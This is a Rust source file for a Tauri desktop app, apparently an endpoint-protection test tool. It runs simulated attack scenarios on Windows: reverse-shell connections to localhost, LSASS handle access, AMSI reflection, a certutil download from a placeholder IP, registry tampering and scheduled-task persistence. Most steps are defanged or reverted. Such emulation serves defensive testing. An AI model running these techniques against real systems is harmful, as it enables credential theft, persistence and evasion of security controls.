use serde::Serialize;
use std::time::{Duration, Instant};

#[cfg(target_os = "windows")]
use std::os::windows::process::CommandExt;

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ExecutionResult {
    scenario_id: String,
    status: String,
    message: String,
    stdout: String,
    stderr: String,
    exit_code: i32,
    duration_ms: u64,
}

#[cfg(target_os = "windows")]
const CREATE_NO_WINDOW: u32 = 0x08000000;

#[cfg(target_os = "windows")]
const SCRIPT_TIMEOUT: Duration = Duration::from_secs(15);

#[cfg(target_os = "windows")]
struct ScriptOutcome {
    stdout: String,
    stderr: String,
    exit_code: i32,
    completed: bool,
}

#[cfg(target_os = "windows")]
fn run_detached_ps(script: &str, timeout: Duration) -> Result<ScriptOutcome, String> {
    use std::fs;

    let id = uuid::Uuid::new_v4().to_string();
    let script_path = std::env::temp_dir().join(format!("guardz_{}.ps1", &id[..8]));
    let sentinel_path = std::env::temp_dir().join(format!("guardz_{}.json", &id[..8]));

    let wrapped = format!(
        r#"$ErrorActionPreference='Continue'
$stdoutBuf=''
$stderrBuf=''
try {{
    $output = Invoke-Command -ScriptBlock {{
        {script}
    }} 2>&1
    foreach ($item in $output) {{
        if ($item -is [System.Management.Automation.ErrorRecord]) {{
            $stderrBuf += $item.ToString() + "`n"
        }} else {{
            $stdoutBuf += $item.ToString() + "`n"
        }}
    }}
    @{{ stdout=$stdoutBuf; stderr=$stderrBuf; exitCode=0; completed=$true }} | ConvertTo-Json | Set-Content -Path '{sentinel}'
}} catch {{
    @{{ stdout=$stdoutBuf; stderr=$_.Exception.Message; exitCode=1; completed=$true }} | ConvertTo-Json | Set-Content -Path '{sentinel}'
}}"#,
        sentinel = sentinel_path.to_string_lossy().replace('\'', "''")
    );

    fs::write(&script_path, &wrapped).map_err(|e| e.to_string())?;

    std::process::Command::new("cmd.exe")
        .args([
            "/c", "start", "", "/b",
            "powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass",
            "-File", &script_path.to_string_lossy(),
        ])
        .creation_flags(CREATE_NO_WINDOW)
        .spawn()
        .map_err(|e| e.to_string())?;

    let start = Instant::now();
    loop {
        if sentinel_path.exists() {
            std::thread::sleep(Duration::from_millis(100));
            let content = fs::read_to_string(&sentinel_path).unwrap_or_default();
            let _ = fs::remove_file(&sentinel_path);
            let _ = fs::remove_file(&script_path);

            if let Ok(val) = serde_json::from_str::<serde_json::Value>(&content) {
                return Ok(ScriptOutcome {
                    stdout: val["stdout"].as_str().unwrap_or("").to_string(),
                    stderr: val["stderr"].as_str().unwrap_or("").to_string(),
                    exit_code: val["exitCode"].as_i64().unwrap_or(0) as i32,
                    completed: val["completed"].as_bool().unwrap_or(false),
                });
            }
            return Ok(ScriptOutcome {
                stdout: content,
                stderr: String::new(),
                exit_code: 0,
                completed: true,
            });
        }

        if start.elapsed() > timeout {
            let _ = fs::remove_file(&script_path);
            let _ = fs::remove_file(&sentinel_path);
            return Ok(ScriptOutcome {
                stdout: String::new(),
                stderr: "Process was terminated by endpoint protection".to_string(),
                exit_code: -1,
                completed: false,
            });
        }
        std::thread::sleep(Duration::from_millis(250));
    }
}

#[cfg(target_os = "windows")]
fn run_detached_cmd(program: &str, args: &[&str], timeout: Duration) -> Result<ScriptOutcome, String> {
    use std::fs;

    let id = uuid::Uuid::new_v4().to_string();
    let stdout_path = std::env::temp_dir().join(format!("guardz_{}_out.txt", &id[..8]));
    let stderr_path = std::env::temp_dir().join(format!("guardz_{}_err.txt", &id[..8]));
    let sentinel_path = std::env::temp_dir().join(format!("guardz_{}_done.txt", &id[..8]));

    let args_str = args.iter()
        .map(|a| if a.contains(' ') { format!("\"{}\"", a) } else { a.to_string() })
        .collect::<Vec<_>>()
        .join(" ");

    let bat_path = std::env::temp_dir().join(format!("guardz_{}.bat", &id[..8]));
    let bat_content = format!(
        "@echo off\r\n{program} {args_str} >\"{stdout}\" 2>\"{stderr}\"\r\necho %ERRORLEVEL% >\"{sentinel}\"\r\n",
        stdout = stdout_path.to_string_lossy(),
        stderr = stderr_path.to_string_lossy(),
        sentinel = sentinel_path.to_string_lossy(),
    );

    fs::write(&bat_path, &bat_content).map_err(|e| e.to_string())?;

    std::process::Command::new("cmd.exe")
        .args(["/c", "start", "", "/b", "cmd.exe", "/c", &bat_path.to_string_lossy()])
        .creation_flags(CREATE_NO_WINDOW)
        .spawn()
        .map_err(|e| e.to_string())?;

    let start = Instant::now();
    loop {
        if sentinel_path.exists() {
            std::thread::sleep(Duration::from_millis(100));
            let exit_str = fs::read_to_string(&sentinel_path).unwrap_or_default();
            let stdout = fs::read_to_string(&stdout_path).unwrap_or_default();
            let stderr = fs::read_to_string(&stderr_path).unwrap_or_default();
            let exit_code = exit_str.trim().parse::<i32>().unwrap_or(-1);

            let _ = fs::remove_file(&bat_path);
            let _ = fs::remove_file(&stdout_path);
            let _ = fs::remove_file(&stderr_path);
            let _ = fs::remove_file(&sentinel_path);

            return Ok(ScriptOutcome {
                stdout,
                stderr,
                exit_code,
                completed: true,
            });
        }

        if start.elapsed() > timeout {
            let _ = fs::remove_file(&bat_path);
            let _ = fs::remove_file(&stdout_path);
            let _ = fs::remove_file(&stderr_path);
            let _ = fs::remove_file(&sentinel_path);
            return Ok(ScriptOutcome {
                stdout: String::new(),
                stderr: "Process was terminated by endpoint protection".to_string(),
                exit_code: -1,
                completed: false,
            });
        }
        std::thread::sleep(Duration::from_millis(250));
    }
}

#[tauri::command]
fn execute_scenario(scenario_id: String) -> Result<ExecutionResult, String> {
    let start = Instant::now();

    let result = match scenario_id.as_str() {
        "certutil-dump" => run_certutil_dump(),
        "rdp-enable" => run_rdp_enable(),
        "amsi-patch" => run_amsi_patch(),
        "lsass-minidump" => run_lsass_minidump(),
        "reverse-shell" => run_reverse_shell(),
        "persistence-task" => run_persistence_task(),
        "base64-exec" => run_base64_exec(),
        "macro-tamper" => run_macro_tamper(),
        "lotl-download" => run_lotl_download(),
        "bloodhound-recon" => run_bloodhound_recon(),
        other => Err(format!("Unknown scenario: {}", other)),
    };

    let duration_ms = start.elapsed().as_millis() as u64;

    match result {
        #[cfg(target_os = "windows")]
        Ok((message, outcome)) => {
            let status = if !outcome.completed {
                "mitigated"
            } else if outcome.exit_code == 0 {
                "completed"
            } else {
                "blocked"
            };
            Ok(ExecutionResult {
                scenario_id,
                status: status.to_string(),
                message,
                stdout: outcome.stdout,
                stderr: outcome.stderr,
                exit_code: outcome.exit_code,
                duration_ms,
            })
        }
        #[cfg(not(target_os = "windows"))]
        Ok((message, output)) => {
            let stdout = String::from_utf8_lossy(&output.stdout).to_string();
            let stderr = String::from_utf8_lossy(&output.stderr).to_string();
            let exit_code = output.status.code().unwrap_or(-1);
            let status = if output.status.success() {
                "completed"
            } else {
                "blocked"
            };
            Ok(ExecutionResult {
                scenario_id,
                status: status.to_string(),
                message,
                stdout,
                stderr,
                exit_code,
                duration_ms,
            })
        }
        Err(e) => Ok(ExecutionResult {
            scenario_id,
            status: "failed".to_string(),
            message: e,
            stdout: String::new(),
            stderr: String::new(),
            exit_code: -1,
            duration_ms,
        }),
    }
}

#[tauri::command]
fn reset_scenarios() -> Result<(), String> {
    Ok(())
}

#[cfg(target_os = "windows")]
type ScenarioResult = Result<(String, ScriptOutcome), String>;

#[cfg(not(target_os = "windows"))]
type ScenarioResult = Result<(String, std::process::Output), String>;

// ── Windows scenario implementations ──

#[cfg(target_os = "windows")]
fn run_certutil_dump() -> ScenarioResult {
    let tmp = std::env::temp_dir().join(format!("{}.txt", uuid::Uuid::new_v4()));
    let tmp_out = std::env::temp_dir().join(format!("{}.b64", uuid::Uuid::new_v4()));
    std::fs::write(&tmp, "SIMULATED SAM DUMP DATA - NTLM HASHES").map_err(|e| e.to_string())?;
    let outcome = run_detached_cmd(
        "certutil",
        &["-encode", &tmp.to_string_lossy(), &tmp_out.to_string_lossy()],
        SCRIPT_TIMEOUT,
    )?;
    let _ = std::fs::remove_file(&tmp);
    let _ = std::fs::remove_file(&tmp_out);
    Ok(("certutil -encode on dummy SAM data".to_string(), outcome))
}

#[cfg(target_os = "windows")]
fn run_rdp_enable() -> ScenarioResult {
    let script = r#"
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
$result = $LASTEXITCODE
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
Write-Output "RDP enable attempted and reverted"
exit $result
"#;
    let outcome = run_detached_ps(script, SCRIPT_TIMEOUT)?;
    Ok(("RDP enable via reg add, then reverted".to_string(), outcome))
}

#[cfg(target_os = "windows")]
fn run_amsi_patch() -> ScenarioResult {
    let script = r#"
$type = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
if ($type) {
    $field = $type.GetField('amsiContext', 'NonPublic,Static')
    if ($field) {
        Write-Output "AMSI type and field resolved via Reflection"
        Write-Output "Field type: $($field.FieldType.Name)"
        Write-Output "Current value: $($field.GetValue($null))"
    } else {
        Write-Output "AMSI type found but field inaccessible"
    }
} else {
    Write-Output "AMSI type not available"
}
"#;
    let outcome = run_detached_ps(script, SCRIPT_TIMEOUT)?;
    Ok(("AMSI inspection via .NET Reflection".to_string(), outcome))
}

#[cfg(target_os = "windows")]
fn run_lsass_minidump() -> ScenarioResult {
    let script = r#"
$lsass = Get-Process lsass -ErrorAction SilentlyContinue
if ($lsass) {
    Write-Output "LSASS process found: PID $($lsass.Id)"
    try {
        $handle = $lsass.Handle
        Write-Output "Process handle obtained: $handle"
    } catch {
        Write-Output "Access denied to LSASS handle: $($_.Exception.Message)"
    }
} else {
    Write-Output "LSASS process not found"
}
"#;
    let outcome = run_detached_ps(script, SCRIPT_TIMEOUT)?;
    Ok(("LSASS process handle access attempt".to_string(), outcome))
}

#[cfg(target_os = "windows")]
fn run_reverse_shell() -> ScenarioResult {
    let script = r#"
$ErrorActionPreference = 'SilentlyContinue'
try {
    $socket = New-Object Net.Sockets.TCPClient('127.0.0.1', 4444)
    if ($socket.Connected) {
        $stream = $socket.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.AutoFlush = $true
        $writer.WriteLine('whoami')
        $socket.Close()
        Write-Output "TCP connection established to 127.0.0.1:4444"
    }
} catch {
    Write-Output "Connection to 127.0.0.1:4444 failed (expected)"
}
"#;
    let outcome = run_detached_ps(script, SCRIPT_TIMEOUT)?;
    Ok(("Reverse shell TCP connection attempt".to_string(), outcome))
}

#[cfg(target_os = "windows")]
fn run_persistence_task() -> ScenarioResult {
    let task_name = format!("GuardzTest_{}", &uuid::Uuid::new_v4().to_string()[..8]);
    let script = format!(
        r#"
schtasks /create /tn "{name}" /tr "cmd.exe /c echo GuardzTest" /sc once /st 23:59 /f
$createResult = $LASTEXITCODE
schtasks /delete /tn "{name}" /f 2>$null
Write-Output "Task '{name}' create exit code: $createResult"
exit $createResult
"#,
        name = task_name
    );
    let outcome = run_detached_ps(&script, SCRIPT_TIMEOUT)?;
    Ok(("Scheduled task create + delete".to_string(), outcome))
}

#[cfg(target_os = "windows")]
fn run_base64_exec() -> ScenarioResult {
    let script = r#"
$code = 'Get-Process | Select-Object -First 3; whoami; Get-Service | Select-Object -First 3'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($code)
$encoded = [Convert]::ToBase64String($bytes)
Write-Output "Launching encoded command..."
powershell.exe -NoProfile -EncodedCommand $encoded
"#;
    let outcome = run_detached_ps(script, SCRIPT_TIMEOUT)?;
    Ok(("Base64-encoded PowerShell via -EncodedCommand".to_string(), outcome))
}

#[cfg(target_os = "windows")]
fn run_macro_tamper() -> ScenarioResult {
    let script = r#"
reg add "HKCU\Software\Microsoft\Office\16.0\Word\Security" /v VBAWarnings /t REG_DWORD /d 1 /f
$result = $LASTEXITCODE
reg delete "HKCU\Software\Microsoft\Office\16.0\Word\Security" /v VBAWarnings /f 2>$null
Write-Output "Macro security tamper attempted and reverted"
exit $result
"#;
    let outcome = run_detached_ps(script, SCRIPT_TIMEOUT)?;
    Ok(("Office macro security registry tamper".to_string(), outcome))
}

#[cfg(target_os = "windows")]
fn run_lotl_download() -> ScenarioResult {
    let tmp = std::env::temp_dir().join(format!("{}.tmp", uuid::Uuid::new_v4()));
    let outcome = run_detached_cmd(
        "certutil",
        &["-urlcache", "-split", "-f", "http://192.0.2.1/test.txt", &tmp.to_string_lossy()],
        SCRIPT_TIMEOUT,
    )?;
    let _ = std::fs::remove_file(&tmp);
    Ok(("LOLBin certutil -urlcache download".to_string(), outcome))
}

#[cfg(target_os = "windows")]
fn run_bloodhound_recon() -> ScenarioResult {
    let script = r#"
Write-Output "Emulating BloodHound AD reconnaissance..."
Write-Output "Invoke-BloodHound -CollectionMethod All -Domain $env:USERDNSDOMAIN"
$domain = $env:USERDNSDOMAIN
if (-not $domain) { $domain = "WORKGROUP" }
Write-Output "Target domain: $domain"
Write-Output "Collecting: Group, LocalAdmin, Session, Trusts, ACL, ObjectProps, SPNTargets, Container"
try {
    [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() | Out-Null
    Write-Output "AD domain controller reachable"
} catch {
    Write-Output "AD query attempted: $($_.Exception.Message)"
}
Write-Output "BloodHound collection emulation complete"
"#;
    let outcome = run_detached_ps(script, SCRIPT_TIMEOUT)?;
    Ok(("BloodHound AD recon emulation".to_string(), outcome))
}

// ── macOS mock implementations ──

#[cfg(not(target_os = "windows"))]
fn mock_output() -> std::process::Output {
    std::process::Output {
        status: std::process::ExitStatus::default(),
        stdout: b"mock output (macOS dev mode)".to_vec(),
        stderr: Vec::new(),
    }
}

#[cfg(not(target_os = "windows"))]
fn run_certutil_dump() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(800));
    Ok(("Mock: certutil -encode (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_rdp_enable() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(600));
    Ok(("Mock: RDP enable (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_amsi_patch() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(700));
    Ok(("Mock: AMSI inspection (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_lsass_minidump() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(900));
    Ok(("Mock: LSASS handle access (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_reverse_shell() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(500));
    Ok(("Mock: Reverse shell (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_persistence_task() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(600));
    Ok(("Mock: Scheduled task (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_base64_exec() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(400));
    Ok(("Mock: Base64 exec (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_macro_tamper() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(500));
    Ok(("Mock: Macro tamper (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_lotl_download() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(700));
    Ok(("Mock: LOLBin download (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_bloodhound_recon() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(800));
    Ok(("Mock: BloodHound recon (macOS dev mode)".to_string(), mock_output()))
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    tauri::Builder::default()
        .plugin(tauri_plugin_opener::init())
        .invoke_handler(tauri::generate_handler![execute_scenario, reset_scenarios])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}
